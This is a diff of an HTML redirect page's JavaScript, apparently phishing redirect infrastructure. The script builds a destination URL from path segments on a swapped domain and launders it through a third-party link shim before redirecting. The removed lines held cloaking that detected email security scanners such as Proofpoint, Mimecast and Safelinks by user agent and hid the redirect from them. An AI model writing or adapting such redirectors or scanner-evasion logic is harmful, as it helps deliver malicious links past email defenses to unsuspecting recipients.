@@ -5,34 +5,25 @@
     <title>Redirecting...</title>
     <script type="text/javascript">
         (function() {
-            // 1. User Agent / Bot Filtering
-            var ua = navigator.userAgent.toLowerCase();
-            var bots = ["safelinks", "proofpoint", "mimecast", "barracuda", "trendmicro", "avanan"];
-            var isBot = bots.some(function(bot) { return ua.indexOf(bot) !== -1; });
-
-            if (isBot) {
-                console.log("Security scanner detected.");
-                return; // Stop the redirect for bots
-            }
-
-            // 2. Parse the URL segments
-            // Example: /blue/test -> parts = ["blue", "test"]
+            // 1. Parse the URL segments
+            // Example: /blue/test -> segments = ["blue", "test"]
             var segments = window.location.pathname.split('/').filter(Boolean);
 
             if (segments.length >= 1) {
                 var subdomain = segments[0];
                 var path = segments.slice(1).join('/') || "";
 
-                // 3. Construct the destination
-                var finalUrl = "https://" + subdomain + ".sanjonescreeks.online/" + path;
+                // 2. Construct the destination
+                var finalUrl = "https://" + subdomain + ".unitysteelfoundations.de/" + path;
                 
-                // 4. Wrap in Link-Shim
+                // 3. Wrap in Link-Shim
                 var wrappedUrl = "https://l.wl.co/l/?u=" + encodeURIComponent(finalUrl);
 
-                // 5. Execute Redirect
+                // 4. Execute Redirect
                 window.location.replace(wrappedUrl);
             } else {
-                window.location.replace("https://sanjonescreeks.online/");
+                // Fallback if no segments are found
+                window.location.replace("https://unitysteelfoundations.de/");
             }
         })();
     </script>
